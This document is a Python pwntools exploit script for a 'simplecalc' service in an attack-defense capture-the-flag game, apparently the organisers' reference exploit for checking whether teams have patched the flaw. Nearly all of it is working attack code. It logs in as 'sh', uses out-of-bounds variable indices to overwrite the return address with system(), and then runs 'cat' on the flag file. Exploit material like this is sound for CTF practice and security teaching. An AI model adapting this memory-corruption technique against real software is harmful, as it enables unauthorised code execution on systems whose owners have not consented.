#!/usr/bin/env python 

import socket
import sys
import json
import traceback

from pwn import *


def exploit(ip, port, flag_id):
    # We read that note, but we don't know the password.
    # (Basically, get_flag without the "token".)
    # This is what players must prevent!
    response = {
        "error": False,
        "payload": {},
    }
    note_id = flag_id

    # Interaction with the service
    # Try to be robust, services will not always answer immediately
    if ip:
        r = remote(ip, port)
    else:
        r = process("../src/simplecalc")

    r.recvuntil("username:")
    r.send("sh\n")
    r.recvuntil("password:")
    r.send("pwned\n")
    r.recvuntil("work:")
    r.send("pwned\n")

    r.recvuntil("result")
    r.send("S\n")
    r.recvuntil("end\n")
    r.send("V0=V-8+0\n")

    # set V1 to address of name
    r.send("V1=V0+8880\n")
    # set V2 to address of system
    r.send("V2=V0+109\n")
    # overwrite ret addr
    r.send("V-1073741792=V2+0\n")
    # put name as argument
    r.send("V-1073741791=V1+0\n")
    # end the solving
    r.send("\n")
    r.send("cat " + flag_id + "*" + "\n")
    content = r.recvuntil("\n").strip()
    response['payload'] = {'flag': content}
    return response


if __name__ == "__main__":
    try:
        print json.dumps(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3]))
    except Exception as e:
        response = {
            "error": True,
            "payload": str(e) + "\n" + traceback.format_exc()
        }
        print json.dumps(response)
